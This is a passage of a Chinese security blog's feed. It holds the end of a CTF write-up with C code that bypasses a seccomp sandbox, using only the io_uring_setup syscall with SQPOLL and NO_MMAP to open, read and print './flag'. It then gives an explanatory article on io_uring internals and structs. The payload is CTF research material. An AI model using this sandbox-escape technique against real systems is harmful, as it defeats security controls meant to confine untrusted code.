class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">0x10</span>] = <span class="string">&quot;AAAAAAAA\n&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *ring_ptr;</span><br><span class="line">    <span class="type">unsigned</span> *ktail;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        __u64 a1;</span><br><span class="line">        __u64 a2;</span><br><span class="line">    &#125; socket_add = <span class="comment">//&#123;0x0100007f5c110002, 0&#125;;</span></span><br><span class="line">        &#123;<span class="number">0x017aa8c05c110002</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">//mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL);</span></span><br><span class="line">    params.sq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x1000</span>;</span><br><span class="line">    ring_ptr = params.cq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;</span><br><span class="line"></span><br><span class="line">    params.sq_thread_idle = <span class="number">0x2000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> (<span class="keyword">struct</span> io_uring_sqe *)(<span class="number">0xC0D3000</span> + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">0</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">1</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    <span class="comment">//sqe[2].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">3</span>].opcode = IORING_OP_READ;</span><br><span class="line">    <span class="comment">//sqe[3].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">3</span>].fd = <span class="number">4</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">3</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">4</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">    <span class="comment">//sqe[4].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">4</span>].fd = <span class="number">1</span>;</span><br><span class="line">    sqe[<span class="number">4</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">4</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ktail = ring_ptr + <span class="number">4</span>;</span><br><span class="line">    io_uring_smp_store_release(ktail, <span class="number">5</span>);</span><br><span class="line">    __do_syscall2(<span class="number">425</span>, <span class="number">0x10</span>, &amp;params);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 &lt;code&gt;io_uring_setup&lt;/code&gt; 一个系统调用，之前不久的ACTF中， 使用&lt;code&gt;mmap&lt;/code&gt;、&lt;code&gt;io_uring_setup&lt;/code&gt;、&lt;code&gt;io_uri</summary>
      
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="linux" scheme="https://v3rdant.cn/tags/linux/"/>
    
    <category term="io_uring" scheme="https://v3rdant.cn/tags/io-uring/"/>
    
    <category term="shellcode" scheme="https://v3rdant.cn/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Linux.io_uring-Top-down-Approch</title>
    <link href="https://v3rdant.cn/Linux.io_uring-Top-down-Approach/"/>
    <id>https://v3rdant.cn/Linux.io_uring-Top-down-Approach/</id>
    <published>2023-12-04T06:08:56.000Z</published>
    <updated>2024-01-12T13:06:54.955Z</updated>
    
    <content type="html"><![CDATA[<p>最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 <code>io_uring_setup</code> 一个系统调用，之前不久的ACTF中， 使用<code>mmap</code>、<code>io_uring_setup</code>、<code>io_uring_enter</code> 三个系统调用，完成了orw。 如何仅仅使用 <code>io_uring_setup</code> 完成orw呢？</p><p>本文将不仅仅局限于CTF，而是从io_uring的实现出发，先从宏观角度透视io_uring的实现框架， 然后以源代码为基础，自顶向下，从liburing，io_uring的用户态接口， 最后到io_uring的内核实现，一步步聚焦 <code>io_uring</code>  具体的实现。</p><p>由于笔者为安全方向，因此笔者将更多关注 io_uring 中用户和内核态的通信这一容易产生安全漏洞的模块，而不会聚焦io_uring的异步调度和任务处理，以上。</p><span id="more"></span><h2 id="overview">overview</h2><p>在开始前，首先介绍一下什么是<a href="https://man.archlinux.org/man/io_uring.7.en">io_uring</a> 。</p><p>io_uring 是 Linux 5.1 引入的一套新的异步 I/O 接口机制,主要有以下特点:</p><ol><li>高效 - 通过共享内存和锁自由的接口设计大大降低了系统调用开销。</li><li>灵活 - 支持阻塞,非阻塞,轮询多种调用方式,可以同时提交多个 I/O 请求并通过轮询或异步方式得到完成通知。</li><li>通用 - 支持文件,网络,时间,引用计数等多种 I/O,统一了异步 I/O 接口。</li></ol><p>io_uring 主要由提交队列(SQ)、完成队列(CQ)、SQEs 请求和 CQEs 结果组成。</p><p>其中SQE和CQE 分别是SQ和CQ中的一个实体。</p><p>应用通过mmap映射SQ和CQ,向SQ提交I/O请求,再通过读CQ获取I/O完成结果。这避免了大量的 context switch 和系统调用开销。</p><p>这里以ACTF星盟的师傅写的liburing实现orw的一个小例子来介绍一下io_uring 的工作原理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref from https://blog.xmcve.com/2023/10/31/ACTF-2023-Writeup/#title-9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUEUE_DEPTH 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span></span><br><span class="line">    <span class="type">int</span> fd, ret;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">4096</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_queue_init&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备打开操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dirfd = AT_FDCWD;  <span class="comment">// 当前工作目录的文件描述符</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line">    <span class="type">int</span> flags = O_RDONLY;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_openat(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Open error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = cqe-&gt;res;  <span class="comment">// 获取打开的文件描述符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备读取操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_read(sqe, fd, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Read error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备写操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_write(sqe, <span class="number">1</span>, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Read error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;Read %d bytes: %s\n&quot;, cqe-&gt;res, buffer);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理并关闭文件</span></span><br><span class="line">    io_uring_cqe_seen(&amp;ring, cqe);</span><br><span class="line">    io_uring_queue_exit(&amp;ring);</span><br><span class="line">    close(fd);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果要使用io_uring会经历如下流程：</p><p>首先通过 <code>io_uring_queue_init</code> 完成了初始化，io_uring的sq和cq队列也被创建</p><p>在库内部实际上是使用 <code>io_uring_setup</code> 和 <code>mmap</code> 两个syscall实现</p><p>前者完成了内核中相应结构体和资源的创建，后者将两个队列映射到用户态内存，通过共享内存方便用户态访问</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;io_uring_queue_init&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，用户使用 <code>io_uring_get_sqe</code> 得到一个sqe，(SQ队列中的一个实体) ，并根据所要完成的任务，设置sqe的各个成员， 这个过程是完全在用户态完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line"><span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dirfd = AT_FDCWD;  <span class="comment">// 当前工作目录的文件描述符</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">int</span> flags = O_RDONLY;</span><br><span class="line"></span><br><span class="line">io_uring_prep_openat(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>最后，通过 <code>io_uring_submit</code> 提交了请求，库内部实际上是调用了 <code>io_uring_enter</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = io_uring_submit(&amp;ring);</span><br></pre></td></tr></table></figure><h3 id="io-uring任务收割模式">io_uring任务收割模式</h3><p>这里主要解释一下 <code>IORING_SETUP_SQPOLL</code> 和 <code>IORING_SETUP_IOPOLL</code> 的区别</p><blockquote><p>IORING_SETUP_SQPOLL<br>When this flag is specified, a kernel thread is created to<br>perform submission queue polling.  An io_uring instance<br>configured in this way enables an application to issue I/O<br>without ever context switching into the kernel.  By using<br>the submission queue to fill in new submission queue<br>entries and watching for completions on the completion<br>queue, the application can submit and reap I/Os without<br>doing a single system call.<br>If the kernel thread is idle for more than sq_thread_idle<br>milliseconds, it will set the IORING_SQ_NEED_WAKEUP bit in<br>the flags field of the struct io_sq_ring.  When this<br>happens, the application must call io_uring_enter(2) to<br>wake the kernel thread.  If I/O is kept busy, the kernel<br>thread will never sleep.  An application making use of<br>this feature will need to guard the io_uring_enter(2) call<br>with the following code sequence:<br>/*<br>* Ensure that the wakeup flag is read after the tail pointer<br>* has been written. It’s important to use memory load acquire<br>* semantics for the flags read, as otherwise the application<br>* and the kernel might not agree on the consistency of the<br>* wakeup flag.<br>*/<br>unsigned flags = atomic_load_relaxed(sq_ring-&gt;flags);<br>if (flags &amp; IORING_SQ_NEED_WAKEUP)<br>io_uring_enter(fd, 0, 0, IORING_ENTER_SQ_WAKEUP);</p></blockquote><blockquote><p>IORING_SETUP_IOPOLL<br>Perform busy-waiting for an I/O completion, as opposed to<br>getting notifications via an asynchronous IRQ (Interrupt<br>Request).  The file system (if any) and block device must<br>support polling in order for this to work.  Busy-waiting<br>provides lower latency, but may consume more CPU resources<br>than interrupt driven I/O.  Currently, this feature is<br>usable only on a file descriptor opened using the O_DIRECT<br>flag.  When a read or write is submitted to a polled<br>context, the application must poll for completions on the<br>CQ ring by calling io_uring_enter(2).  It is illegal to<br>mix and match polled and non-polled I/O on an io_uring<br>instance.<br>This is only applicable for storage devices for now, and<br>the storage device must be configured for polling. How to<br>do that depends on the device type in question. For NVMe<br>devices, the nvme driver must be loaded with the<br>poll_queues parameter set to the desired number of polling<br>queues. The polling queues will be shared appropriately<br>between the CPUs in the system, if the number is less than<br>the number of online CPU threads.</p></blockquote><p>即，SQPOLL 通过内核线程定时唤醒来收割任务<br>IOPOLL 通过 <code>io_uring_enter</code> 通知内核来收割任务</p><h3 id="struct">struct</h3><p>其次，需要在讲解前，介绍一下 liburing 和 内核暴露出的一些结构体：</p><h4 id="liburing">liburing</h4><p>首先是 <code>io_uring</code> 这是liburing 关于io_uring的核心管理结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> <span class="title">sq</span>;</span> <span class="comment">// sq 管理结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cq</span> <span class="title">cq</span>;</span> <span class="comment">// cq 管理结构体</span></span><br><span class="line"><span class="type">unsigned</span> flags;        <span class="comment">// setup时的flag设置</span></span><br><span class="line"><span class="comment">// 以下setup返回时写入params的一些信息</span></span><br><span class="line"><span class="type">int</span> ring_fd;           </span><br><span class="line"><span class="type">unsigned</span> features;   </span><br><span class="line"><span class="type">int</span> enter_ring_fd;</span><br><span class="line">__u8 int_flags;</span><br><span class="line">__u8 pad[<span class="number">3</span>];</span><br><span class="line"><span class="type">unsigned</span> pad2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_uring_sq</code>， sq的管理结构体， 这个结构体在6.5及以下的版本可以在内核中找到，在6.5以上的版本在内核中删除了，6.5以上存在io_rings，相当于io_uring_sq和io_uring_cq 的组合</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> *khead;</span><br><span class="line"><span class="type">unsigned</span> *ktail;</span><br><span class="line"><span class="comment">// Deprecated: use `ring_mask` instead of `*kring_mask`</span></span><br><span class="line"><span class="type">unsigned</span> *kring_mask;</span><br><span class="line"><span class="comment">// Deprecated: use `ring_entries` instead of `*kring_entries`</span></span><br><span class="line"><span class="type">unsigned</span> *kring_entries;</span><br><span class="line"><span class="type">unsigned</span> *kflags;</span><br><span class="line"><span class="type">unsigned</span> *kdropped;</span><br><span class="line"><span class="type">unsigned</span> *<span class="built_in">array</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqes</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> sqe_head;</span><br><span class="line"><span class="type">unsigned</span> sqe_tail;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> ring_sz;</span><br><span class="line"><span class="type">void</span> *ring_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> ring_mask;</span><br><span class="line"><span class="type">unsigned</span> ring_entries;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> pad[<span class="number">2</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在此着重解释一下ring_ptr和 sqes两个成员：<br>这两个成员，在没有设置NO_MMAP的情况下，都是由 <code>io_uring_setup</code> 后用mmap映射得到的。</p><p>ring_prt指向一连串内核用来处理io_uring时的信息，例如当前循环队列head和tail， <code>io_uring_setup</code> 返回时会设置 <code>io_uring_params</code> 中的 sq_off 结构，这个结构就记录了各个成员信息，相对于ring_ptr的偏移， 最后在 [[#io_uring_setup_ring_pointers]] 中设置相关变量指向和内核共享的内存区域中对应的偏移。</p><p>而sqes，就是真正的共享队列的区域</p><p>类似的，存在io_uring_cq 结构体</p><h4 id="kernel">kernel</h4><p>首先是<code>io_uring_params</code></p><p>他是<code>io_uring_setup</code> 传入的参数，同时，返回时，kernel会给此结构体相应成员赋值.</p><p>此结构体也是提供给用户态的API</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> &#123;</span></span><br><span class="line">__u32 sq_entries;</span><br><span class="line">__u32 cq_entries;</span><br><span class="line">__u32 flags;</span><br><span class="line">__u32 sq_thread_cpu;   <span class="comment">// 内核任务处理线程占用的cpu</span></span><br><span class="line">__u32 sq_thread_idle;  <span class="comment">// 内核任务处理线程最大闲置时间，</span></span><br><span class="line">   <span class="comment">// 见`IORING_SETUP_SQPOLL`</span></span><br><span class="line">__u32 features;</span><br><span class="line">__u32 wq_fd;</span><br><span class="line">__u32 resv[<span class="number">3</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sqring_offsets</span> <span class="title">sq_off</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_cqring_offsets</span> <span class="title">cq_off</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 